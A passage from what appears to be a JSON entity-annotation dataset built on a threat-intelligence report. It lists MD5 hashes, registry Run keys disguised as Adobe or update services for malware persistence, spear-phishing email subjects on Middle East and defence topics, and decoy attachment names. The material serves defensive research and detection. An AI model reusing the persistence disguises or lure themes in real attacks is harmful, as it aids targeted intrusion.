"pos": [4, 5], "sent_id": 133, "type": "MD5"}], [{"name": "7bcdd0e5996e849d1068fcffdec81371", "pos": [0, 1], "sent_id": 134, "type": "MD5"}], [{"name": "7bee4b7d948433a58b18d2189d480a29", "pos": [1, 2], "sent_id": 134, "type": "MD5"}], [{"name": "7cd15bb31ff889e81f370d0535e02493", "pos": [2, 3], "sent_id": 134, "type": "MD5"}], [{"name": "7d00ea1262125b2b0469dd639b810823", "pos": [0, 1], "sent_id": 135, "type": "MD5"}], [{"name": "7d101cc3b87ac51c0c1ca8a4371bc84a", "pos": [1, 2], "sent_id": 135, "type": "MD5"}], [{"name": "7d21e2b1b293f4176ba1d8abc2460328", "pos": [2, 3], "sent_id": 135, "type": "MD5"}], [{"name": "7e75928b5ce3dd41c9b9b1e67cff16d6", "pos": [0, 1], "sent_id": 136, "type": "MD5"}], [{"name": "7f7cc1a8d7a6bbe6a52c94bb7f41f727", "pos": [1, 2], "sent_id": 136, "type": "MD5"}], [{"name": "7f90942ace185ca1ba5610f6eddf3376", "pos": [0, 1], "sent_id": 137, "type": "MD5"}], [{"name": "8027234685f88f3b74c45b245c841843", "pos": [1, 2], "sent_id": 137, "type": "MD5"}], [{"name": "802a3965e42e75cc3dcd5f5523929859", "pos": [2, 3], "sent_id": 137, "type": "MD5"}], [{"name": "80ba5a336a4044c1406774d56e130e7e", "pos": [3, 4], "sent_id": 137, "type": "MD5"}], [{"name": "80c58de2dbd1571228b538c9556cd29d", "pos": [4, 5], "sent_id": 137, "type": "MD5"}], [{"name": "824bee27f10d5c81879657c8a2af9f0c", "pos": [5, 6], "sent_id": 137, "type": "MD5"}], [{"name": "82c598abdf848c6fef03c63f5cf7feaf", "pos": [6, 7], "sent_id": 137, "type": "MD5"}], [{"name": "834a274599aed64959b3b2bfe931af4c", "pos": [0, 1], "sent_id": 139, "type": "MD5"}], [{"name": "83cdbc9aa1907d55dda3e28149e897cc", "pos": [0, 1], "sent_id": 140, "type": "MD5"}], [{"name": "83d45d80682afa9b2526029b2bc2fb33", "pos": [1, 2], "sent_id": 140, "type": "MD5"}], [{"name": "850ac92dfa39f2391addc2d888c62ef8", "pos": [2, 3], "sent_id": 140, "type": "MD5"}], [{"name": "8548dd501aaf132b134aa3849e15d2aa", "pos": [3, 4], "sent_id": 140, "type": "MD5"}], [{"name": "85873c12599490a0f7db691b0c5179ae", "pos": [4, 5], "sent_id": 140, "type": "MD5"}], [{"name": "860d5840c3b1a750d8c4e6bc68ecfbab", "pos": [5, 6], "sent_id": 140, "type": "MD5"}], [{"name": "867d80bc1c369ca7ee429c727d2c5fea", "pos": [6, 7], "sent_id": 140, "type": "MD5"}], [{"name": "875cb4844bc03f6da7a60553632c7678", "pos": [7, 8], "sent_id": 140, "type": "MD5"}], [{"name": "888eadff6982de01c60891ce185473b7", "pos": [8, 9], "sent_id": 140, "type": "MD5"}], [{"name": "88c0e5a4ca408ac12acaaf7a9ef9eb49", "pos": [9, 10], "sent_id": 140, "type": "MD5"}], [{"name": "894ef915af830f38499d498342fdd8db", "pos": [10, 11], "sent_id": 140, "type": "MD5"}], [{"name": "8a413af90665ca7909bcdcf19cd566ed", "pos": [11, 12], "sent_id": 140, "type": "MD5"}], [{"name": "8ac64b904c188ef6b73dbc5073cee1a9", "pos": [12, 13], "sent_id": 140, "type": "MD5"}], [{"name": "8b69f0a948c32288f3fab4ed2845cb1b", "pos": [13, 14], "sent_id": 140, "type": "MD5"}], [{"name": "8ba366ef5ecd802c82289dcea22b2146", "pos": [0, 1], "sent_id": 141, "type": "MD5"}], [{"name": "8c148fe80ae705af284b92f1c283013a", "pos": [1, 2], "sent_id": 141, "type": "MD5"}], [{"name": "8c3a791ce682e3c5da5bcfbce261eeaa", "pos": [2, 3], "sent_id": 141, "type": "MD5"}], [{"name": "8c76de0a8ac79536b96619613960681c", "pos": [3, 4], "sent_id": 141, "type": "MD5"}], [{"name": "8d3a6b78118b647a7f31f06a46c27fd4", "pos": [0, 1], "sent_id": 142, "type": "MD5"}], [{"name": "8dc7eb49fe1fbf490f90c153a71c60a5", "pos": [0, 1], "sent_id": 143, "type": "MD5"}], [{"name": "8e2e709c01ccb286c51ac9e592eea48a", "pos": [0, 1], "sent_id": 144, "type": "MD5"}], [{"name": "8e53ad954f05d2c3f57b19b1ecb0fea0", "pos": [0, 1], "sent_id": 145, "type": "MD5"}], [{"name": "8f8e948a2f9afd7ece6dc6603cfbd56a", "pos": [1, 2], "sent_id": 145, "type": "MD5"}], [{"name": "8fbbf38c053dbb0da3dd2fd6af4869d2", "pos": [2, 3], "sent_id": 145, "type": "MD5"}], [{"name": "905d5cd372fb22dd5f9804adb2d2787b", "pos": [3, 4], "sent_id": 145, "type": "MD5"}], [{"name": "9157d078effa4b727180c40bedb74ef6", "pos": [0, 1], "sent_id": 146, "type": "MD5"}], [{"name": "920dffe40787f1f3fdb24548b4a210db", "pos": [1, 2], "sent_id": 146, "type": "MD5"}], [{"name": "92785f445f366ed548388b1af6b01f9c", "pos": [2, 3], "sent_id": 146, "type": "MD5"}], [{"name": "9327f1eefb18fde7f622fc2efbbbdb4b", "pos": [0, 1], "sent_id": 147, "type": "MD5"}], [{"name": "939e07685fec28a15f88786b097bb14b", "pos": [0, 1], "sent_id": 148, "type": "MD5"}], [{"name": "9400950fa381ba1750c914fa9e6fd85e", "pos": [1, 2], "sent_id": 148, "type": "MD5"}], [{"name": "942b1ca8c3c64be1e4c40e26c9e39ad8", "pos": [0, 1], "sent_id": 149, "type": "MD5"}], [{"name": "962c52436706b5c226894de0436b860e", "pos": [1, 2], "sent_id": 149, "type": "MD5"}], [{"name": "96ee5acbe155f37ff1604b4fd259e55f", "pos": [2, 3], "sent_id": 149, "type": "MD5"}], [{"name": "96f31d6fda587b43887e846876e5c399", "pos": [0, 1], "sent_id": 150, "type": "MD5"}], [{"name": "975c718bf93ca5d0693bb0d4c7e42d1e", "pos": [0, 1], "sent_id": 151, "type": "MD5"}], [{"name": "99b58e416c5e8e0bcdcd39ba417a08ed", "pos": [1, 2], "sent_id": 151, "type": "MD5"}], [{"name": "9a58902740c5b73eb6a68a126ac6ac55", "pos": [0, 1], "sent_id": 152, "type": "MD5"}], [{"name": "9a847c1f54359ffd3c335e97600f6f5d", "pos": [0, 1], "sent_id": 153, "type": "MD5"}], [{"name": "9aca099f7cd3b3b29551b67af48467d1", "pos": [1, 2], "sent_id": 153, "type": "MD5"}], [{"name": "9be590614e2407dc144ad6c100a2873a", "pos": [0, 1], "sent_id": 154, "type": "MD5"}], [{"name": "9bf4683c09a2d60294ff79ce026f4e64", "pos": [1, 2], "sent_id": 154, "type": "MD5"}], [{"name": "9cc15358d6ce18150dbee6be3281151d", "pos": [2, 3], "sent_id": 154, "type": "MD5"}], [{"name": "9cd1e3b67540bdc2fc4a3835e170bc65", "pos": [3, 4], "sent_id": 154, "type": "MD5"}], [{"name": "9e6b8b265f05302eca455ce8ea10a3aa", "pos": [4, 5], "sent_id": 154, "type": "MD5"}], [{"name": "9fcb233ee18df6c19b1ad3922dd41a2a", "pos": [0, 1], "sent_id": 155, "type": "MD5"}], [{"name": "9fd0e94fce1543b75b44414a61b252b0", "pos": [0, 1], "sent_id": 156, "type": "MD5"}], [{"name": "a01ea69e4c10721ec088676cef67d8bd", "pos": [0, 1], "sent_id": 157, "type": "MD5"}], [{"name": "a19e68e72084d867a39776faaa6f5fce", "pos": [1, 2], "sent_id": 157, "type": "MD5"}], [{"name": "a1fa946523928c16340cf40daa2ffb53", "pos": [2, 3], "sent_id": 157, "type": "MD5"}], [{"name": "a26a85c33ddf57d720040629931be174", "pos": [0, 1], "sent_id": 158, "type": "MD5"}], [{"name": "a4847e655c817e3c5112e888a2877f4d", "pos": [1, 2], "sent_id": 158, "type": "MD5"}], [{"name": "a4d476fb7b084bd01a847ab7e0d839b5", "pos": [0, 1], "sent_id": 159, "type": "MD5"}], [{"name": "a55f6c8b795ccdc469b9b67b22ddc88b", "pos": [1, 2], "sent_id": 159, "type": "MD5"}], [{"name": "a637ea307380ba21a355c3cffd37639a", "pos": [15, 16], "sent_id": 160, "type": "MD5"}], [{"name": "a6cba31fcca49ff9ed6fd9894644de9e", "pos": [16, 17], "sent_id": 160, "type": "MD5"}], [{"name": "a76f0fada1602e9c119cba24306442b4", "pos": [17, 18], "sent_id": 160, "type": "MD5"}], [{"name": "a98d2c90b9494fc885c7cd35d43666ea", "pos": [0, 1], "sent_id": 161, "type": "MD5"}], [{"name": "a9c20499d43f9674cc37dbfa81381203", "pos": [1, 2], "sent_id": 161, "type": "MD5"}], [{"name": "a9d2caa6ebbfd5be071748e59e754cf4", "pos": [0, 1], "sent_id": 162, "type": "MD5"}], [{"name": "a9e0a604e5b8ed5f4f286c3355d7a0fb", "pos": [1, 2], "sent_id": 162, "type": "MD5"}], [{"name": "aaa01f776acabdf9f07ea3eaff1695d6", "pos": [2, 3], "sent_id": 162, "type": "MD5"}], [{"name": "ac2b219ede57f9d14cdce38e987862aa", "pos": [3, 4], "sent_id": 162, "type": "MD5"}], [{"name": "ac9e0b2af215821f7223b6eaeaea03db", "pos": [4, 5], "sent_id": 162, "type": "MD5"}], [{"name": "ad95f613fc4b644bd5e3230eb0b5dbcc", "pos": [0, 1], "sent_id": 163, "type": "MD5"}], [{"name": "adb97252b05a6e82697bf93c347bdf25", "pos": [0, 1], "sent_id": 164, "type": "MD5"}], [{"name": "aea5dc22e706c836d056f4ba1f13dea3", "pos": [1, 2], "sent_id": 164, "type": "MD5"}], [{"name": "af285fa9a141f422b8ccbfb4e9a00054", "pos": [2, 3], "sent_id": 164, "type": "MD5"}], [{"name": "b18cabead7248e8156230c71399b79c9", "pos": [3, 4], "sent_id": 164, "type": "MD5"}], [{"name": "b19ef1134f54b4021f99cc45ae1bc270", "pos": [4, 5], "sent_id": 164, "type": "MD5"}], [{"name": "b1c540b4b9c8a87a1e87a76ed289f18d", "pos": [5, 6], "sent_id": 164, "type": "MD5"}], [{"name": "b2784e4dc6e602d9d6bf09325bba8c4e", "pos": [6, 7], "sent_id": 164, "type": "MD5"}], [{"name": "b29556856203049b9e7b05e01f5ae73f", "pos": [7, 8], "sent_id": 164, "type": "MD5"}], [{"name": "b3056919871fc01a1ed3294e2014e0c4", "pos": [8, 9], "sent_id": 164, "type": "MD5"}], [{"name": "b41c02eb41070e0a2e459abf2fc39b69", "pos": [9, 10], "sent_id": 164, "type": "MD5"}], [{"name": "b44cd1fa5d8beb08519bbe0c1d796b0f", "pos": [10, 11], "sent_id": 164, "type": "MD5"}], [{"name": "b457372a87597b746ce69e05c4a7d3fa", "pos": [11, 12], "sent_id": 164, "type": "MD5"}], [{"name": "b653012d2bfa4e3419d97eb9f2e5ed4a", "pos": [12, 13], "sent_id": 164, "type": "MD5"}], [{"name": "b665ea35f8f7954657eed1e54517843d", "pos": [13, 14], "sent_id": 164, "type": "MD5"}], [{"name": "b68eadb2a8069c7e88535e1ebfb4be0a", "pos": [14, 15], "sent_id": 164, "type": "MD5"}], [{"name": "b8c83b3549ebb24b3e00dd23c2aa050a", "pos": [15, 16], "sent_id": 164, "type": "MD5"}], [{"name": "b8f77674d292d205f8f5cf6c3f3c34df", "pos": [16, 17], "sent_id": 164, "type": "MD5"}], [{"name": "b8fdf06f78341581870477574e2b08c3", "pos": [17, 18], "sent_id": 164, "type": "MD5"}], [{"name": "b921e0d11127af9613804c63cddd86ca", "pos": [18, 19], "sent_id": 164, "type": "MD5"}], [{"name": "b9367aba4f267b82a838223df016bd6b", "pos": [19, 20], "sent_id": 164, "type": "MD5"}], [{"name": "b96b79f4f1b4306ac2c63fc988305fb0", "pos": [20, 21], "sent_id": 164, "type": "MD5"}], [{"name": "ba700e3a83fec3cc984e1fb572aa0add", "pos": [21, 22], "sent_id": 164, "type": "MD5"}], [{"name": "bbb4bdd1d7e8589d145163f1efd458f5", "pos": [22, 23], "sent_id": 164, "type": "MD5"}], [{"name": "bbbf285e8344f7df330f93c7c3baf27f", "pos": [23, 24], "sent_id": 164, "type": "MD5"}], [{"name": "bbccf8643368c80dd083fb92d67d00be", "pos": [24, 25], "sent_id": 164, "type": "MD5"}], [{"name": "bbdce1e1991f292d366097a743da3724", "pos": [25, 26], "sent_id": 164, "type": "MD5"}], [{"name": "bcc6addece28265390b2d535d65c49b8", "pos": [26, 27], "sent_id": 164, "type": "MD5"}], [{"name": "bd6481ed6dfe67ba9f2f8f26e2cee722", "pos": [0, 1], "sent_id": 165, "type": "MD5"}], [{"name": "bdf512d5eef853d07c0db345345e3db7", "pos": [1, 2], "sent_id": 165, "type": "MD5"}], [{"name": "be3799da210edb81143d609e66e5b7ff", "pos": [2, 3], "sent_id": 165, "type": "MD5"}], [{"name": "be54e3660bf928b8b5f764f5cdfdc4da", "pos": [3, 4], "sent_id": 165, "type": "MD5"}], [{"name": "bf18ef997b7d589f031f47799a33f27b", "pos": [4, 5], "sent_id": 165, "type": "MD5"}], [{"name": "bf65727accaa53d65c31ed5b582053c5", "pos": [5, 6], "sent_id": 165, "type": "MD5"}], [{"name": "bf778439895829ff986207900bfcfe02", "pos": [6, 7], "sent_id": 165, "type": "MD5"}], [{"name": "c1438390098e4dc7bb8b52efcf1d2465", "pos": [7, 8], "sent_id": 165, "type": "MD5"}], [{"name": "c1919e6f2e05feb9dc9b6ab9f81dcb2f", "pos": [0, 1], "sent_id": 166, "type": "MD5"}], [{"name": "c243a7c1cf23b91f73100bb9e947439e", "pos": [1, 2], "sent_id": 166, "type": "MD5"}], [{"name": "c32696b255bac4b849fc249e56944a91", "pos": [2, 3], "sent_id": 166, "type": "MD5"}], [{"name": "c376aecf43bf021b6408ca99cd31da01", "pos": [3, 4], "sent_id": 166, "type": "MD5"}], [{"name": "c5062bbbb15911a63de77a66773874d9", "pos": [4, 5], "sent_id": 166, "type": "MD5"}], [{"name": "c63cc0a8b0b3a70f7b835a3fff9f02a5", "pos": [5, 6], "sent_id": 166, "type": "MD5"}], [{"name": "c8607553e37cc1fc870572670c1910f5", "pos": [6, 7], "sent_id": 166, "type": "MD5"}], [{"name": "c89d4d40e4b68a9952121b62b0dda920", "pos": [7, 8], "sent_id": 166, "type": "MD5"}], [{"name": "c9570396c897e02ec8aa195c6241f945", "pos": [8, 9], "sent_id": 166, "type": "MD5"}], [{"name": "c9a32616f89dc953486bd1b5d83359ec", "pos": [15, 16], "sent_id": 167, "type": "MD5"}], [{"name": "c9b4c4d65298dc10be6784d0f0ad8519", "pos": [16, 17], "sent_id": 167, "type": "MD5"}], [{"name": "c9f19071bac9d4eb3b08b4017c0d9c4d", "pos": [17, 18], "sent_id": 167, "type": "MD5"}], [{"name": "cac3bc3039cd73935051ad8df2e53d34", "pos": [18, 19], "sent_id": 167, "type": "MD5"}], [{"name": "cb40ff3b3ed8c1966defbe1dafdd1326", "pos": [19, 20], "sent_id": 167, "type": "MD5"}], [{"name": "cca75af9786d7364866f40b80dddcc5c", "pos": [20, 21], "sent_id": 167, "type": "MD5"}], [{"name": "cd5f3dbea197dc5afb673e42f0e9c3fe", "pos": [21, 22], "sent_id": 167, "type": "MD5"}], [{"name": "cdc0c4fdc649dec017ace0f2898068d0", "pos": [22, 23], "sent_id": 167, "type": "MD5"}], [{"name": "cec766518fa5b607157e92e9c24c0d03", "pos": [23, 24], "sent_id": 167, "type": "MD5"}], [{"name": "cf5356cdf42d264d5213cce4cd415f0b", "pos": [0, 1], "sent_id": 168, "type": "MD5"}], [{"name": "cf96139290c09963a32506cd85825ed3", "pos": [1, 2], "sent_id": 168, "type": "MD5"}], [{"name": "d3174652816010a7f6d8f4523ee3a077", "pos": [2, 3], "sent_id": 168, "type": "MD5"}], [{"name": "d4036f03c760084cc677edf4ee6c4a39", "pos": [3, 4], "sent_id": 168, "type": "MD5"}], [{"name": "d46d261ec92daf703cd584f10037198c", "pos": [4, 5], "sent_id": 168, "type": "MD5"}], [{"name": "d5027d35c8bd9e867113bd4a1edb931f", "pos": [5, 6], "sent_id": 168, "type": "MD5"}], [{"name": "d58323fb222b9ff681c0982ba286a296", "pos": [6, 7], "sent_id": 168, "type": "MD5"}], [{"name": "d6b1989d9c271b8575326e4fca159ae8", "pos": [7, 8], "sent_id": 168, "type": "MD5"}], [{"name": "d6b198eda724e2b3367502a6a2232939", "pos": [8, 9], "sent_id": 168, "type": "MD5"}], [{"name": "d6b467c92256094f720e9fc75f149737", "pos": [9, 10], "sent_id": 168, "type": "MD5"}], [{"name": "d6d5aeb79899485f5734bf8847782266", "pos": [0, 1], "sent_id": 169, "type": "MD5"}], [{"name": "d6e98d062d7900c6fe9a6d7f0b1d7fec", "pos": [1, 2], "sent_id": 169, "type": "MD5"}], [{"name": "d6ff4333eb1a2305d5b6cf4705213393", "pos": [2, 3], "sent_id": 169, "type": "MD5"}], [{"name": "d795292ea23217480ad92939daf6dd22", "pos": [3, 4], "sent_id": 169, "type": "MD5"}], [{"name": "d83055efe66377067ce99d99c706f19a", "pos": [4, 5], "sent_id": 169, "type": "MD5"}], [{"name": "d8f7aaad3677fac1cde911c7362c2b69", "pos": [5, 6], "sent_id": 169, "type": "MD5"}], [{"name": "d910d21bd54b63ef61b3f250fe73dcc6", "pos": [6, 7], "sent_id": 169, "type": "MD5"}], [{"name": "da451674bb68804b390bd7413691c91e", "pos": [7, 8], "sent_id": 169, "type": "MD5"}], [{"name": "dab17bcceae6f32eae5d800d0d3f9e46", "pos": [8, 9], "sent_id": 169, "type": "MD5"}], [{"name": "db6ae6da64f14168b3624e26191277cf", "pos": [9, 10], "sent_id": 169, "type": "MD5"}], [{"name": "db7d3724e5f004168a1a56f6b9de3cd5", "pos": [10, 11], "sent_id": 169, "type": "MD5"}], [{"name": "dd5aad5d66bc96e5ac60cbe5d132c2ec", "pos": [11, 12], "sent_id": 169, "type": "MD5"}], [{"name": "de5eeb9847a5fbc1a6cbb4cfb8bb6aa0", "pos": [12, 13], "sent_id": 169, "type": "MD5"}], [{"name": "df53ce3797932d9e62ceaa760a3f0e3e", "pos": [13, 14], "sent_id": 169, "type": "MD5"}], [{"name": "dfaa6250dc947602d5dc200e503f23a5", "pos": [14, 15], "sent_id": 169, "type": "MD5"}], [{"name": "dff3a274e5fa35013601c7985bf13d56", "pos": [15, 16], "sent_id": 169, "type": "MD5"}], [{"name": "dff7ac111e48115e208c2649b94b1115", "pos": [16, 17], "sent_id": 169, "type": "MD5"}], [{"name": "e0b3a0fd042ff50e0de22725864775b8", "pos": [0, 1], "sent_id": 170, "type": "MD5"}], [{"name": "e1117ec1ea73b6da7f2c051464ad9197", "pos": [1, 2], "sent_id": 170, "type": "MD5"}], [{"name": "e2494eba419891c0c101af74eb8c029c", "pos": [2, 3], "sent_id": 170, "type": "MD5"}], [{"name": "e2620e1cf89830e8de1e8c4530829a15", "pos": [3, 4], "sent_id": 170, "type": "MD5"}], [{"name": "e27f0975fd3278e7303102783767c508", "pos": [4, 5], "sent_id": 170, "type": "MD5"}], [{"name": "e2a557b39231ee91724c150e3ec4b493", "pos": [5, 6], "sent_id": 170, "type": "MD5"}], [{"name": "e2be37df12f7b98b2b73197d77773263", "pos": [0, 1], "sent_id": 171, "type": "MD5"}], [{"name": "e4255f51a871a95baa10b6b2c4ed2470", "pos": [0, 1], "sent_id": 172, "type": "MD5"}], [{"name": "e62bb947d72d12311890f2e07eb6ac8b", "pos": [0, 1], "sent_id": 173, "type": "MD5"}], [{"name": "e6446d52e9f4b5c2c5a9ac850281cae8", "pos": [1, 2], "sent_id": 173, "type": "MD5"}], [{"name": "e649b8b9e541406446da47d8d0a91385", "pos": [2, 3], "sent_id": 173, "type": "MD5"}], [{"name": "e6ffb1c6e1508f474a69f091435454ce", "pos": [3, 4], "sent_id": 173, "type": "MD5"}], [{"name": "e85863b1de035814b4b01a2b6c477dd1", "pos": [4, 5], "sent_id": 173, "type": "MD5"}], [{"name": "e90b037f1cbc79796fd8b1f6382c8483", "pos": [5, 6], "sent_id": 173, "type": "MD5"}], [{"name": "e93a4f4872bf6cd8c3f0eed6017a8d41", "pos": [6, 7], "sent_id": 173, "type": "MD5"}], [{"name": "ea823850b777993d636e4a565568f734", "pos": [7, 8], "sent_id": 173, "type": "MD5"}], [{"name": "ead35eab94820d5a34f185d0b26b7930", "pos": [8, 9], "sent_id": 173, "type": "MD5"}], [{"name": "ebe291e968eb5a86b4963d27352bc525", "pos": [9, 10], "sent_id": 173, "type": "MD5"}], [{"name": "eced29c71867e375aed0da408d6b07f4", "pos": [10, 11], "sent_id": 173, "type": "MD5"}], [{"name": "ed665cf8a48f08f8b4fed8bbf9d2d998", "pos": [0, 1], "sent_id": 175, "type": "MD5"}], [{"name": "ee998128e20971ca4296a8a73ed79f43", "pos": [1, 2], "sent_id": 175, "type": "MD5"}], [{"name": "eea7ae4eb726c3e05f187110090adb18", "pos": [2, 3], "sent_id": 175, "type": "MD5"}], [{"name": "ef10f4f11032d48f7e82c0a788c0f489", "pos": [3, 4], "sent_id": 175, "type": "MD5"}], [{"name": "efaadcfa4271c50927ab817e0c4a0bc3", "pos": [4, 5], "sent_id": 175, "type": "MD5"}], [{"name": "f0a00cfd891059b70af96b807e9f9ab8", "pos": [5, 6], "sent_id": 175, "type": "MD5"}], [{"name": "f15cff24d8a3a9ffce590cc8e69baec9", "pos": [6, 7], "sent_id": 175, "type": "MD5"}], [{"name": "f1c4b919fdf008a8400189562f5e2fba", "pos": [7, 8], "sent_id": 175, "type": "MD5"}], [{"name": "f29cb80bde4af21c226596e9d125795d", "pos": [8, 9], "sent_id": 175, "type": "MD5"}], [{"name": "f2f2cad79dcfb356db7b2485c7a27f03", "pos": [0, 1], "sent_id": 176, "type": "MD5"}], [{"name": "f643fa851203e9159c9dc50e4ab8d81e", "pos": [1, 2], "sent_id": 176, "type": "MD5"}], [{"name": "f74ec871c77e4b5e5b2ae0917b1f0f21", "pos": [2, 3], "sent_id": 176, "type": "MD5"}], [{"name": "f7820d429d3185ad00e6758c343e29ce", "pos": [0, 1], "sent_id": 177, "type": "MD5"}], [{"name": "f82d3b270b16780044817978f4f3fe1a", "pos": [1, 2], "sent_id": 177, "type": "MD5"}], [{"name": "f9d2c3e8f81b9c44a1837478b2a98e5e", "pos": [2, 3], "sent_id": 177, "type": "MD5"}], [{"name": "fb0b900de6d286321fd6d20c6c4f5679", "pos": [3, 4], "sent_id": 177, "type": "MD5"}], [{"name": "fbb0c14cacc60fdd393fb5889d5a0b57", "pos": [4, 5], "sent_id": 177, "type": "MD5"}], [{"name": "fc97b89541b149e0dd9937ba876b3ee1", "pos": [5, 6], "sent_id": 177, "type": "MD5"}], [{"name": "fd130b2bce93caf18bc23f1526daae99", "pos": [6, 7], "sent_id": 177, "type": "MD5"}], [{"name": "fd31f952637370a30d74c2a65ba8d2cd", "pos": [7, 8], "sent_id": 177, "type": "MD5"}], [{"name": "fd9b5c35c042a6c462187067fb869aac", "pos": [8, 9], "sent_id": 177, "type": "MD5"}], [{"name": "fde5e109bfab33964564f387f8940030", "pos": [9, 10], "sent_id": 177, "type": "MD5"}], [{"name": "fe568a370aa3d2c78125ab37c16484d1", "pos": [10, 11], "sent_id": 177, "type": "MD5"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Acroread\"", "pos": [15, 17], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Adobe Update\"", "pos": [17, 20], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"AdobeCheck\"", "pos": [20, 22], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"AdobeCom\"", "pos": [22, 24], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"IMSCMig\"", "pos": [24, 26], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"McUpdate\"", "pos": [26, 28], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Register\"", "pos": [28, 30], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"SysTray\"", "pos": [30, 32], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"systemupdate\"", "pos": [32, 34], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"wininstaller\"", "pos": [34, 36], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"APVSVC\"", "pos": [36, 38], "sent_id": 180, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"AdobeUpdate\"", "pos": [38, 40], "sent_id": 180, "type": "Indicator"}], [{"name": "Capt [REMOVED] update", "pos": [39, 44], "sent_id": 183, "type": "Email"}], [{"name": "Fw: LES Request", "pos": [0, 4], "sent_id": 184, "type": "Email"}], [{"name": "Libya crisis", "pos": [0, 2], "sent_id": 185, "type": "Email"}], [{"name": "Five Simple Questions for Democrats on Spending Cuts", "pos": [0, 8], "sent_id": 186, "type": "Email"}], [{"name": "Behind the Easing of Israeli-Palestinian Tensions", "pos": [8, 16], "sent_id": 186, "type": "Email"}], [{"name": "Business Exec Urges Broad Trade Agenda To Curb China Role In Latin America", "pos": [16, 29], "sent_id": 186, "type": "Email"}], [{"name": "President Chavezs Comments About President Obama and the United States on Sundays", "pos": [29, 41], "sent_id": 186, "type": "Email"}], [{"name": "\"Alo,Presidente\"", "pos": [41, 46], "sent_id": 186, "type": "Email"}], [{"name": "FW: New Standdard Operational Procedures (SOPs) between the", "pos": [46, 57], "sent_id": 186, "type": "Email"}], [{"name": "AGENDA", "pos": [57, 58], "sent_id": 186, "type": "Email"}], [{"name": "[REMOVED] Help You Save Enough for Retirement", "pos": [0, 9], "sent_id": 187, "type": "Email"}], [{"name": "Human right of north Afica under war", "pos": [0, 7], "sent_id": 188, "type": "Email"}], [{"name": "Spreading Civil Unrest in the Middle East and North Africa", "pos": [0, 10], "sent_id": 189, "type": "Email"}], [{"name": "The latest analysis on Syria", "pos": [0, 5], "sent_id": 190, "type": "Email"}], [{"name": "International Atomic Energy Agency invite you to attend Atomic Energy Summit", "pos": [5, 16], "sent_id": 190, "type": "Email"}], [{"name": "GAC Monthly Report", "pos": [16, 19], "sent_id": 190, "type": "Email"}], [{"name": "Emergency notification", "pos": [19, 21], "sent_id": 190, "type": "Email"}], [{"name": "Meeting information of [REMOVED]", "pos": [0, 6], "sent_id": 191, "type": "Email"}], [{"name": "Meeting information of [REMOVED]", "pos": [0, 6], "sent_id": 191, "type": "Email"}], [{"name": "Meeting notice from [REMOVED]", "pos": [0, 6], "sent_id": 193, "type": "Email"}], [{"name": "Meeting notice from [REMOVED]", "pos": [0, 6], "sent_id": 193, "type": "Email"}], [{"name": "FY12 Government Opportunities", "pos": [0, 3], "sent_id": 195, "type": "Email"}], [{"name": "Yemen para for SC briefing", "pos": [3, 8], "sent_id": 195, "type": "Email"}], [{"name": "Fighting Protectionism and Promoting Trade and Investment", "pos": [8, 15], "sent_id": 195, "type": "Email"}], [{"name": "Weekly Security Report", "pos": [15, 18], "sent_id": 195, "type": "Email"}], [{"name": "Agenda of [REMOVED] Visit in July 2011", "pos": [18, 27], "sent_id": 195, "type": "Email"}], [{"name": "Agenda of [REMOVED] Visit in July 2011", "pos": [18, 27], "sent_id": 195, "type": "Email"}], [{"name": "Obituary Notice", "pos": [36, 38], "sent_id": 195, "type": "Email"}], [{"name": "Updated Roster 20110712", "pos": [38, 41], "sent_id": 195, "type": "Email"}], [{"name": "2011 project budget", "pos": [41, 44], "sent_id": 195, "type": "Email"}], [{"name": "[REMOVED] National Security Seminar", "pos": [0, 6], "sent_id": 196, "type": "Email"}], [{"name": "Current internatinal situation surrounding Syria", "pos": [0, 5], "sent_id": 197, "type": "Email"}], [{"name": "New Update of Health & Medical force", "pos": [5, 12], "sent_id": 197, "type": "Email"}], [{"name": "FW:How to Get Free Airline Tickets", "pos": [0, 8], "sent_id": 198, "type": "Email"}], [{"name": "Nuclear Security and Summit Diplomacy", "pos": [8, 13], "sent_id": 198, "type": "Email"}], [{"name": "Fw: [REMOVED] Defence & Security Industry Mission to [REMOVED] 201", "pos": [0, 15], "sent_id": 199, "type": "Email"}], [{"name": "[REMOVED] heriketlik pilani", "pos": [0, 5], "sent_id": 200, "type": "Email"}], [{"name": "2012 Global aerospace and defense industry outlook", "pos": [5, 12], "sent_id": 200, "type": "Email"}], [{"name": "Five Simple Questions for Democrats on Spending Cuts.doc", "pos": [49, 57], "sent_id": 202, "type": "File"}], [{"name": "Behind the Easing of Israeli-Palestinian Tensions.doc", "pos": [57, 65], "sent_id": 202, "type": "File"}], [{"name": "Business Exec Urges Broad Trade AgendaTo Curb China Role In Latin America.doc", "pos": [65, 77], "sent_id": 202, "type": "File"}], [{"name": "PatriotLMSR2009Fin .doc", "pos": [77, 79], "sent_id": 202, "type": "File"}], [{"name": "New SOPs for HEC Coord with NATO.pdf", "pos": [0, 7], "sent_id": 203, "type": "File"}], [{"name": "agenda201005.pdf", "pos": [0, 1], "sent_id": 204, "type": "File"}], 